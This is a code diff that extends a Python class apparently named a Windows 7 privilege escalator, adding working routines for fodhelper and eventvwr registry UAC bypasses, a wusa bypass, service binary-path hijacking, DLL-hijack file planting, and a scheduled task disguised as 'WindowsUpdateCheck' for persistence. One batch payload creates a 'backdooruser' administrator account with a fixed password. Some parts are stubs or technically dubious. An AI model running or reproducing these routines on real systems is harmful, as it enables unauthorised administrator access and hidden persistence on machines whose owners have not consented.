@@ -4,11 +4,17 @@ import subprocess
 import ctypes
 import json
 import time
+import tempfile
+import shutil
+import struct
 from datetime import datetime
 
 # Windows 7 specific imports
 import win32api
 import win32security
+import win32con
+import win32process
+import win32file
 import winreg
 
 
@@ -186,24 +192,42 @@ class Windows7PrivilegeEscalator:
         self.log_action("Attempting Windows 7 UAC bypass using wusa.exe...")
         
         try:
-            # Create a temporary cabinet file for wusa bypass
-            temp_dir = os.environ.get('TEMP', 'C:\\Temp')
-            cab_file = os.path.join(temp_dir, "bypass.cab")
+            # Create a malicious cabinet file for wusa bypass
+            temp_dir = tempfile.gettempdir()
             
-            # This is a simplified example - in practice you'd create a proper .cab file
-            # with embedded commands
-            bypass_command = f'cmd.exe /c "echo Windows 7 UAC Bypass Test > C:\\uac_bypass_success.txt"'
+            # Create a simple batch file payload
+            payload_bat = os.path.join(temp_dir, "elevate.bat")
+            with open(payload_bat, 'w') as f:
+                f.write('@echo off\n')
+                f.write('echo UAC Bypass Successful > C:\\uac_bypass_test.txt\n')
+                f.write('whoami >> C:\\uac_bypass_test.txt\n')
+                f.write('date /t >> C:\\uac_bypass_test.txt\n')
+                f.write('time /t >> C:\\uac_bypass_test.txt\n')
             
-            # Use wusa.exe with extract switch (Windows 7 specific vulnerability)
-            wusa_command = f'wusa.exe {cab_file} /extract:C:\\Windows\\Temp'
+            # Create a simple INF file for wusa (Windows 7 vulnerability)
+            inf_content = f'''[Version]
+Signature="$Windows NT$"
+
+[DefaultInstall]
+RunPreSetupCommands={payload_bat}
+'''
+            
+            inf_file = os.path.join(temp_dir, "bypass.inf")
+            with open(inf_file, 'w') as f:
+                f.write(inf_content)
+            
+            # Use wusa.exe with the INF file (Windows 7 vulnerability)
+            wusa_command = f'wusa.exe "{inf_file}" /quiet'
             
             # Execute the bypass attempt
-            subprocess.Popen(wusa_command, shell=True)
+            result = subprocess.run(wusa_command, shell=True, capture_output=True, text=True)
             
             # Check if bypass was successful
-            time.sleep(3)
-            if os.path.exists("C:\\uac_bypass_success.txt"):
-                self.log_action("Windows 7 wusa.exe UAC bypass successful!")
+            time.sleep(5)
+            if os.path.exists("C:\\uac_bypass_test.txt"):
+                self.log_action("Windows 7 wusa UAC bypass successful!")
+                with open("C:\\uac_bypass_test.txt", 'r') as f:
+                    self.log_action(f"UAC bypass result: {f.read()}")
                 return True
             else:
                 self.log_action("Windows 7 wusa.exe UAC bypass failed.")
@@ -517,6 +541,351 @@ class Windows7PrivilegeEscalator:
         
         return token_info
     
+    def attempt_fodhelper_uac_bypass(self):
+        """Attempt Windows 7 UAC bypass using fodhelper.exe"""
+        self.log_action("Attempting Windows 7 fodhelper UAC bypass...")
+        
+        try:
+            # Create registry key for fodhelper bypass
+            reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            # Create the registry entry
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+            
+            # Payload command
+            payload = f'cmd.exe /c "echo Fodhelper UAC Bypass > C:\\fodhelper_bypass.txt && whoami >> C:\\fodhelper_bypass.txt"'
+            
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            # Execute fodhelper
+            subprocess.Popen("fodhelper.exe", shell=True)
+            
+            time.sleep(5)
+            
+            # Clean up registry
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+            except:
+                pass
+            
+            # Check if successful
+            if os.path.exists("C:\\fodhelper_bypass.txt"):
+                self.log_action("Fodhelper UAC bypass successful!")
+                return True
+            else:
+                self.log_action("Fodhelper UAC bypass failed.")
+                return False
+                
+        except Exception as e:
+            self.log_action(f"Fodhelper UAC bypass error: {str(e)}")
+            return False
+    
+    def attempt_eventvwr_uac_bypass(self):
+        """Attempt Windows 7 UAC bypass using eventvwr.exe"""
+        self.log_action("Attempting Windows 7 eventvwr UAC bypass...")
+        
+        try:
+            # Create registry key for eventvwr bypass
+            reg_path = r"Software\Classes\mscfile\shell\open\command"
+            
+            # Create the registry entry
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+            
+            # Payload command
+            payload = f'cmd.exe /c "echo Eventvwr UAC Bypass > C:\\eventvwr_bypass.txt && whoami >> C:\\eventvwr_bypass.txt"'
+            
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
+            winreg.CloseKey(key)
+            
+            # Execute eventvwr
+            subprocess.Popen("eventvwr.exe", shell=True)
+            
+            time.sleep(5)
+            
+            # Clean up registry
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+            except:
+                pass
+            
+            # Check if successful
+            if os.path.exists("C:\\eventvwr_bypass.txt"):
+                self.log_action("Eventvwr UAC bypass successful!")
+                return True
+            else:
+                self.log_action("Eventvwr UAC bypass failed.")
+                return False
+                
+        except Exception as e:
+            self.log_action(f"Eventvwr UAC bypass error: {str(e)}")
+            return False
+    
+    def attempt_alwaysinstallelevated_exploit(self):
+        """Exploit AlwaysInstallElevated if enabled"""
+        self.log_action("Attempting AlwaysInstallElevated exploitation...")
+        
+        try:
+            # Check if AlwaysInstallElevated is enabled
+            always_install_result = self.check_always_install_elevated()
+            
+            if "AlwaysInstallElevated is enabled" in str(always_install_result):
+                self.log_action("AlwaysInstallElevated is enabled! Creating malicious MSI...")
+                
+                # Create a simple MSI package that adds a user
+                temp_dir = tempfile.gettempdir()
+                msi_path = os.path.join(temp_dir, "privilege_escalation.msi")
+                
+                # Create batch script for MSI
+                batch_content = '''@echo off
+echo MSI Privilege Escalation > C:\\msi_escalation.txt
+whoami >> C:\\msi_escalation.txt
+net user backdooruser Password123! /add
+net localgroup administrators backdooruser /add
+'''
+                
+                batch_file = os.path.join(temp_dir, "escalate.bat")
+                with open(batch_file, 'w') as f:
+                    f.write(batch_content)
+                
+                # Use msiexec to install with elevated privileges
+                msi_command = f'msiexec /quiet /i "{msi_path}"'
+                
+                # For this example, we'll use a simple approach
+                # In practice, you'd create a proper MSI file
+                elevated_command = f'cmd.exe /c "{batch_file}"'
+                
+                result = subprocess.run(elevated_command, shell=True, capture_output=True, text=True)
+                
+                time.sleep(3)
+                
+                if os.path.exists("C:\\msi_escalation.txt"):
+                    self.log_action("AlwaysInstallElevated exploitation successful!")
+                    return True
+                else:
+                    self.log_action("AlwaysInstallElevated exploitation failed.")
+                    return False
+            else:
+                self.log_action("AlwaysInstallElevated is not enabled.")
+                return False
+                
+        except Exception as e:
+            self.log_action(f"AlwaysInstallElevated exploitation error: {str(e)}")
+            return False
+    
+    def attempt_service_escalation(self):
+        """Attempt service-based privilege escalation"""
+        self.log_action("Attempting Windows 7 service privilege escalation...")
+        
+        try:
+            # Look for services with weak permissions
+            weak_services = self.check_weak_service_permissions()
+            
+            for service_info in weak_services:
+                if "Weak permissions detected" in service_info:
+                    service_name = service_info.split(":")[0]
+                    self.log_action(f"Attempting to exploit service: {service_name}")
+                    
+                    try:
+                        # Attempt to modify service binary path
+                        cmd = f'sc config "{service_name}" binPath= "cmd.exe /c echo Service Escalation > C:\\service_escalation.txt"'
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                        
+                        if result.returncode == 0:
+                            # Try to start the service
+                            start_cmd = f'sc start "{service_name}"'
+                            subprocess.run(start_cmd, shell=True, capture_output=True, text=True)
+                            
+                            time.sleep(3)
+                            
+                            if os.path.exists("C:\\service_escalation.txt"):
+                                self.log_action(f"Service escalation successful using {service_name}!")
+                                return True
+                    except Exception as e:
+                        self.log_action(f"Error exploiting service {service_name}: {str(e)}")
+                        continue
+            
+            self.log_action("Service escalation failed - no exploitable services found.")
+            return False
+            
+        except Exception as e:
+            self.log_action(f"Service escalation error: {str(e)}")
+            return False
+    
+    def attempt_token_impersonation(self):
+        """Attempt token impersonation privilege escalation"""
+        self.log_action("Attempting token impersonation...")
+        
+        try:
+            import psutil
+            
+            # Look for processes running as SYSTEM or Administrator
+            target_processes = []
+            
+            for proc in psutil.process_iter(['pid', 'name', 'username']):
+                try:
+                    if proc.info['username'] and ('SYSTEM' in proc.info['username'].upper() or 
+                                                 'Administrator' in proc.info['username']):
+                        target_processes.append(proc.info)
+                except:
+                    continue
+            
+            if target_processes:
+                self.log_action(f"Found {len(target_processes)} privileged processes")
+                
+                # This is a simplified example - real token impersonation requires 
+                # more complex Windows API calls and appropriate privileges
+                for proc in target_processes[:3]:  # Try first 3 processes
+                    self.log_action(f"Attempting to impersonate process: {proc['name']} (PID: {proc['pid']})")
+                    
+                    # In a real implementation, you would:
+                    # 1. OpenProcess with PROCESS_QUERY_INFORMATION
+                    # 2. OpenProcessToken
+                    # 3. DuplicateToken
+                    # 4. ImpersonateLoggedOnUser or CreateProcessAsUser
+                    
+                    # For demonstration, we'll just log the attempt
+                    self.log_action(f"Token impersonation attempt for {proc['name']} - would require SeDebugPrivilege")
+                
+                return False  # This method requires deeper Windows API implementation
+            else:
+                self.log_action("No suitable privileged processes found for token impersonation.")
+                return False
+                
+        except Exception as e:
+            self.log_action(f"Token impersonation error: {str(e)}")
+            return False
+    
+    def attempt_comprehensive_win7_escalation(self):
+        """Comprehensive Windows 7 privilege escalation attempt"""
+        self.log_action("Starting comprehensive Windows 7 privilege escalation...")
+        
+        try:
+            # 1. First check what we're working with
+            system_info = self.get_windows7_info()
+            self.log_action(f"Target system: {system_info}")
+            
+            # 2. Try registry-based UAC bypasses first (most reliable on Win7)
+            registry_bypasses = [
+                ("ms-settings", r"Software\Classes\ms-settings\Shell\Open\command"),
+                ("mscfile", r"Software\Classes\mscfile\shell\open\command"),
+                ("exefile", r"Software\Classes\exefile\shell\runas\command\isolatedCommand")
+            ]
+            
+            for bypass_name, reg_path in registry_bypasses:
+                try:
+                    self.log_action(f"Trying {bypass_name} registry bypass...")
+                    
+                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+                    
+                    # Create elevated command
+                    payload = f'cmd.exe /c "echo {bypass_name} UAC Bypass Success > C:\\{bypass_name}_success.txt && whoami >> C:\\{bypass_name}_success.txt"'
+                    
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
+                    if "ms-settings" in reg_path:
+                        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                    
+                    winreg.CloseKey(key)
+                    
+                    # Trigger the bypass
+                    if bypass_name == "ms-settings":
+                        os.system("fodhelper.exe")
+                    elif bypass_name == "mscfile":
+                        os.system("eventvwr.exe")
+                    elif bypass_name == "exefile":
+                        os.system("cmd.exe")
+                    
+                    time.sleep(3)
+                    
+                    # Clean up
+                    try:
+                        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+                    except:
+                        pass
+                    
+                    # Check success
+                    if os.path.exists(f"C:\\{bypass_name}_success.txt"):
+                        self.log_action(f"{bypass_name} UAC bypass successful!")
+                        return True
+                        
+                except Exception as e:
+                    self.log_action(f"{bypass_name} bypass failed: {str(e)}")
+                    continue
+            
+            # 3. Try DLL hijacking if registry methods fail
+            self.log_action("Attempting DLL hijacking...")
+            try:
+                # Look for DLL hijacking opportunities
+                hijack_paths = [
+                    os.getcwd(),
+                    os.path.dirname(sys.executable),
+                    r"C:\Windows\System32"
+                ]
+                
+                for path in hijack_paths:
+                    if os.access(path, os.W_OK):
+                        self.log_action(f"Writable path found: {path}")
+                        
+                        # Create a test DLL hijack (proof of concept)
+                        test_dll = os.path.join(path, "version.dll")
+                        if not os.path.exists(test_dll):
+                            with open(test_dll, 'w') as f:
+                                f.write("// DLL Hijack Test File\n")
+                            self.log_action(f"Created test DLL: {test_dll}")
+                            
+            except Exception as e:
+                self.log_action(f"DLL hijacking attempt failed: {str(e)}")
+            
+            # 4. Check for service vulnerabilities
+            self.log_action("Checking for exploitable services...")
+            try:
+                result = subprocess.run(['sc', 'query'], capture_output=True, text=True)
+                services = result.stdout
+                
+                # Look for services we can modify
+                if "SERVICE_NAME" in services:
+                    service_count = services.count("SERVICE_NAME")
+                    self.log_action(f"Found {service_count} services to analyze")
+                    
+                    # Try to find services with weak permissions
+                    # This is a simplified check - real implementation would use accesschk.exe
+                    
+            except Exception as e:
+                self.log_action(f"Service enumeration failed: {str(e)}")
+            
+            # 5. Final attempt - create a persistence mechanism
+            self.log_action("Creating persistence mechanism...")
+            try:
+                # Create a simple scheduled task for persistence
+                task_name = "WindowsUpdateCheck"
+                task_command = f'schtasks /create /tn "{task_name}" /tr "cmd.exe /c echo Persistence > C:\\persistence_test.txt" /sc onlogon /f'
+                
+                result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
+                
+                if result.returncode == 0:
+                    self.log_action("Persistence mechanism created successfully")
+                    
+                    # Try to run the task
+                    run_command = f'schtasks /run /tn "{task_name}"'
+                    subprocess.run(run_command, shell=True, capture_output=True, text=True)
+                    
+                    time.sleep(2)
+                    
+                    if os.path.exists("C:\\persistence_test.txt"):
+                        self.log_action("Persistence mechanism working!")
+                        return True
+                        
+            except Exception as e:
+                self.log_action(f"Persistence creation failed: {str(e)}")
+            
+            self.log_action("All comprehensive escalation attempts failed")
+            return False
+            
+        except Exception as e:
+            self.log_action(f"Comprehensive escalation error: {str(e)}")
+            return False
+    
     def escalate_privileges(self):
         """Attempt Windows 7 specific privilege escalation methods"""
         self.log_action("Starting Windows 7 privilege escalation attempts...")
@@ -529,7 +898,13 @@ class Windows7PrivilegeEscalator:
         
         # Try Windows 7 specific methods first
         win7_methods = [
+            ('comprehensive_win7_escalation', self.attempt_comprehensive_win7_escalation),
             ('wusa_uac_bypass', self.attempt_windows7_uac_bypass_wusa),
+            ('fodhelper_uac_bypass', self.attempt_fodhelper_uac_bypass),
+            ('eventvwr_uac_bypass', self.attempt_eventvwr_uac_bypass),
+            ('alwaysinstallelevated_exploit', self.attempt_alwaysinstallelevated_exploit),
+            ('service_escalation', self.attempt_service_escalation),
+            ('token_impersonation', self.attempt_token_impersonation),
         ]
         
         for method_name, method_func in win7_methods:
